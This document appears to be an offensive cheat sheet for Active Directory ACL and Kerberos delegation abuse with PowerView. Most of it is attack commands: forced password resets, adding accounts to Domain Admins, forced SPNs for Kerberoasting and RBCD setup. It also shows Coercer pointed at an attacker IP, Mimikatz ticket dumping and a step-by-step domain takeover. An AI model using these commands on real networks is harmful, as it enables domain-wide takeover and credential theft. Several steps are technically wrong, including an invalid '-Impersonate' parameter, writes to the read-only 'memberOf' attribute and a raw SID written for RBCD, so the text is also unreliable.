# PowerView ACL Abuse & Attack Paths

## GenericAll on User (Full Control)

PowerView detects: `GenericAll` right on User object.

### Exploitation Chains

**1. Reset Password (No Auth Needed)**
```powershell
# PowerView command to find vulnerable users:
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where {$_.AceType -eq "All"}

# Exploit:
Set-DomainUserPassword -Identity "TargetUser" -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force) -Confirm:$false

# Then login as TargetUser with new password
```

**2. Add Kerberoasting (Force SPN)**
```powershell
# Add SPN to user (makes them Kerberoastable):
Set-DomainObject -Identity "TargetUser" -Set @{serviceprincipalname="HTTP/target.domain.com"}

# Now domain users can Kerberoast this account:
Invoke-Kerberoast -Identity "TargetUser"

# Crack offline
hashcat -m 13100 ticket.txt wordlist.txt
```

**3. Shadow Credentials (Modern, Works on Windows 10+)**
```powershell
# Add certificate-based auth:
# (Requires SKD + Python tools like pywhisker or C# alternatives)

# High-value target: Service accounts, privileged users
```

**4. Modify Attributes for Privilege Escalation**
```powershell
# Add user to high-value group:
Add-DomainGroupMember -Identity "Domain Admins" -Members "LowPrivUser" -Confirm:$false

# Or via direct LDAP write:
$user = Get-DomainUser "LowPrivUser"
Set-DomainObject -Identity $user -Set @{memberof="CN=Domain Admins,CN=Users,DC=domain,DC=com"}
```

---

## GenericAll on Group (Full Control)

### Exploitation

**1. Add Yourself to Group**
```powershell
# If you have GenericAll on "Domain Admins":
Add-DomainGroupMember -Identity "Domain Admins" -Members "YourUser" -Confirm:$false

# Instant domain admin privilege escalation
```

**2. Modify Group Membership Policy**
```powershell
# Modify group so anyone can join:
Set-DomainObject -Identity "TargetGroup" -Set @{memberOf="CN=Domain Users,CN=Users,DC=domain,DC=com"}
```

**3. Change Group Owner**
```powershell
# Change owner to your account:
Set-DomainObject -Identity "TargetGroup" -Owner "YourUser"

# As owner, you can modify members
```

---

## ACL Chains (Multi-Step)

PowerView helps identify ACL chains leading to domain compromise.

### Example Chain 1: User → Group → Domain Admins

```
Your User
  ↓ (GenericWrite on) 
  ↓
Computer "WEBSERVER"
  ↓ (WriteProperty: msDS-AllowedToActOnBehalfOfOtherIdentity)
  ↓ (RBCD — Resource-Based Constrained Delegation)
  ↓
Domain Admin
  ↓ (Can impersonate)
  ↓
SYSTEM access anywhere in domain
```

**Exploitation:**
```powershell
# 1. Find computer you have write access to:
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where {$_.AceType -eq "WriteProperty"}

# 2. Create compromised machine account (if MachineAccountQuota > 0):
New-MachineAccount -ComputerName "FAKE$" -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force)

# 3. Write RBCD to target computer:
Set-DomainObject -Identity "WEBSERVER" -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$fakeComputerSID}

# 4. Request TGT for fake computer:
Invoke-Kerberoast -Identity "WEBSERVER$" -Impersonate "Domain Admin"

# 5. Profit (Domain Admin TGT)
```

---

## Kerberos Delegation Abuse

### Unconstrained Delegation

**Detection:**
```powershell
# PowerView:
Get-DomainComputer -UnConstrained

# Check for TrustedForDelegation flag:
Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation
```

**Exploitation:**
```powershell
# 1. Compromise machine with unconstrained delegation
# 2. Coerce DC to authenticate (Coercer, PetitPotam):
python3 coercer.py -t <target> -l <attacker-ip> -m websvc

# 3. Capture TGT from DC in Kerberos cache
# 4. Extract and reuse (or pass-the-ticket)
Invoke-Mimikatz -Command '"kerberos::list"'
```

### Constrained Delegation (S4U2Self / S4U2Proxy)

**Detection:**
```powershell
# PowerView:
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Check msDS-AllowedToDelegateTo:
Get-DomainUser | Select samAccountName, @{N='AllowedToDelegateTo'; E={$_.msDS-AllowedToDelegateTo}}
```

**Exploitation:**
```powershell
# If compromised user has constrained delegation to DC/admin service:
Invoke-Kerberoast -Identity "Service" -Force

# Use S4U2Self to request TGT as admin
# (Advanced - requires kerberosast + tickettools)
```

### Resource-Based Constrained Delegation (RBCD)

**Detection:**
```powershell
# Find computers with RBCD configured:
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where {$_.AceType -eq "WriteProperty" -and $_.AceQualifier -eq "Allow"}
```

**Exploitation:**
```powershell
# 1. Compromise account with GenericAll on computer:
# 2. Create fake computer account or use existing one
# 3. Write SID to msDS-AllowedToActOnBehalfOfOtherIdentity
# 4. Request TGT as admin service via S4U2Self/S4U2Proxy
```

---

## Dangerous ACE Combinations

| ACE Type | On | Impact | Mitigation |
|---|---|---|---|
| **GenericAll** | User | Password reset, Kerberoasting, SPN modification | Restrict to admins only |
| **GenericAll** | Group | Add members, modify policy | Limit group mgmt perms |
| **GenericAll** | Computer | RBCD abuse, executable replacement | Audit RBCD configs |
| **WriteProperty:msDS-AllowedToActOnBehalfOfOtherIdentity** | Computer | RBCD setup | Disable RBCD where not needed |
| **WriteDACL** | Any object | Modify ACLs to gain more privs | Critical finding |
| **WriteOwner** | Any object | Change owner, modify later | Critical finding |
| **ForceChangePassword** | User | Reset password without auth | Restrict service accounts |
| **Self (membership)** | Group | Add yourself to group | Monitor group additions |

---

## Real-World Attack Scenario

```
Step 1: Run PowerView to enumerate domain
  Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where {$_.AceType -eq "All"}

Step 2: Identify low-privilege user with GenericAll on "Domain Admins"
  Attacker account: "john.doe"
  Target: "Domain Admins" group
  
Step 3: Add yourself (if you have GenericAll on Domain Admins):
  Add-DomainGroupMember -Identity "Domain Admins" -Members "john.doe"
  
Step 4: Verify membership:
  Get-DomainGroupMember "Domain Admins" | Where Name -eq "john.doe"
  
Step 5: Immediate domain admin privileges
  ✅ Can modify any domain object
  ✅ Can reset passwords
  ✅ Can modify group memberships
  ✅ Can read LSASS (Mimikatz on DC)
  ✅ Can perform DCSync
```

---

## References & Tools

- **PowerView.ps1** — [Empire/PowerTools](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
- **BloodHound** — Visual ACL paths ([Bloodhound Community Edition](https://github.com/BloodHoundAD/BloodHound))
- **Coercer** — DC coercion for unconstrained delegation ([Coercer on GitHub](https://github.com/p0dalirius/Coercer))
- **pywhisker** — Shadow Credentials ([pywhisker](https://github.com/ShutdownRepo/pywhisker))
- **Kerberoast** — [Invoke-Kerberoast](https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/credentials/invoke_kerberoast.py)
